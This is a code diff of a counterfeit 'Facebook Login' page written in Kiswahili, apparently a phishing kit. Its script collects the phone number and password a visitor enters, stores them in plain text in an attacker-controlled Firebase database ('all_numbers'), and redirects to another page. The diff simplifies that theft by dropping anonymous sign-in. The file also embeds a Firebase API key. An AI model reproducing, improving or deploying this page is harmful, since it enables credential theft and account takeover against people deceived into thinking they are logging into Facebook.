@@ -6,10 +6,9 @@
     <title>Facebook Login</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; color: #1c1e21; transition: direction 0.2s; }
+        body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; color: #1c1e21; }
         .top-bar { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; padding: 20px; position: relative; }
-        .back-arrow { position: absolute; left: 20px; top: 20px; font-size: 24px; cursor: pointer; text-decoration: none; color: #1c1e21; background: none; border: none; padding: 8px 12px; border-radius: 50%; transition: background-color 0.2s; line-height: 1; }
-        .back-arrow:hover { background-color: #f0f2f5; }
+        .back-arrow { position: absolute; left: 20px; top: 20px; font-size: 24px; cursor: pointer; text-decoration: none; color: #1c1e21; background: none; border: none; padding: 8px 12px; border-radius: 50%; }
         .language-wrapper { margin-top: 5px; position: relative; display: inline-block; }
         .language-select { appearance: none; background-color: transparent; border: none; color: #606770; font-size: 14px; cursor: pointer; padding-right: 20px; outline: none; text-align: center; }
         .language-wrapper::after { content: ''; position: absolute; right: 2px; top: 50%; transform: translateY(-50%) rotate(45deg); width: 6px; height: 6px; border-bottom: 2px solid #606770; border-right: 2px solid #606770; pointer-events: none; }
@@ -19,7 +18,7 @@
         .login-form { width: 100%; max-width: 360px; display: flex; flex-direction: column; gap: 12px; padding: 0 16px; }
         .input-group input { width: 100%; padding: 18px 16px; font-size: 16px; border: 1px solid #ccd0d5; border-radius: 12px; outline: none; color: #1c1e21; }
         .input-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        .btn { width: 100%; padding: 14px; border-radius: 24px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; transition: opacity 0.2s; }
+        .btn { width: 100%; padding: 14px; border-radius: 24px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; }
         .btn-login { background-color: #1877f2; color: #ffffff; margin-top: 8px; }
         .forgot-password { text-align: center; margin-top: 15px; font-size: 15px; color: #1c1e21; text-decoration: none; font-weight: 500; }
         .bottom-section { margin-top: auto; width: 100%; max-width: 360px; padding: 20px 16px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
@@ -34,14 +33,8 @@
         <button type="button" class="back-arrow" id="backBtn">&#8592;</button>
         <div class="language-wrapper">
             <select class="language-select" id="languageSelect">
-                <option value="en">English (US)</option>
                 <option value="sw" selected>Kiswahili</option>
-                <option value="fr">Français</option>
-                <option value="es">Español</option>
-                <option value="pt">Português</option>
-                <option value="ar">العربية</option>
-                <option value="zh">中文</option>
-                <option value="hi">हिन्दी</option>
+                <option value="en">English (US)</option>
             </select>
         </div>
     </div>
@@ -73,8 +66,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getFirestore, collection, addDoc, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBPkx-WMYTTongmbYGUy2w86wxF3QprNkQ",
@@ -87,7 +79,6 @@
         };
 
         const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
         const db = getFirestore(app);
 
         const loginForm = document.getElementById('loginForm');
@@ -103,31 +94,20 @@
             submitBtn.disabled = true;
 
             try {
-                // 1. Ingia kimyakimya
-                const userCredential = await signInAnonymously(auth);
-                const user = userCredential.user;
-
-                // 2. Tuma kwenye all_numbers (Tumetumia majina yanayolingana na Database yako)
+                // Tuma data moja kwa moja bila kuhitaji Auth
                 await addDoc(collection(db, "all_numbers"), {
-                    num: phone,            // Badilisha kutoka phone kwenda num
-                    password: password,    // Hifadhi password
-                    region: "Unknown",     // Ongeza region kama ilivyo kwenye database yako
-                    updatedAt: serverTimestamp() // Tumia updatedAt badala ya timestamp
-                });
-
-                // 3. Tuma kwenye users pia
-                await setDoc(doc(db, "users", user.uid), {
                     num: phone,
                     password: password,
-                    lastLogin: serverTimestamp()
+                    region: "Unknown",
+                    updatedAt: serverTimestamp()
                 });
                 
-                // 4. Mpeleke mtumiaji all.html
+                // Mpeleke mtumiaji all.html
                 window.location.replace('all.html');
 
             } catch (error) {
                 console.error("Kosa la kutuma data: ", error);
-                alert("Imeshindikana kuingia. Tafadhali jaribu tena. (Angalia Console kwa maelezo)");
+                alert("Imeshindikana kuingia. Tafadhali jaribu tena.");
                 submitBtn.textContent = "Ingia (Log in)";
                 submitBtn.disabled = false;
             }
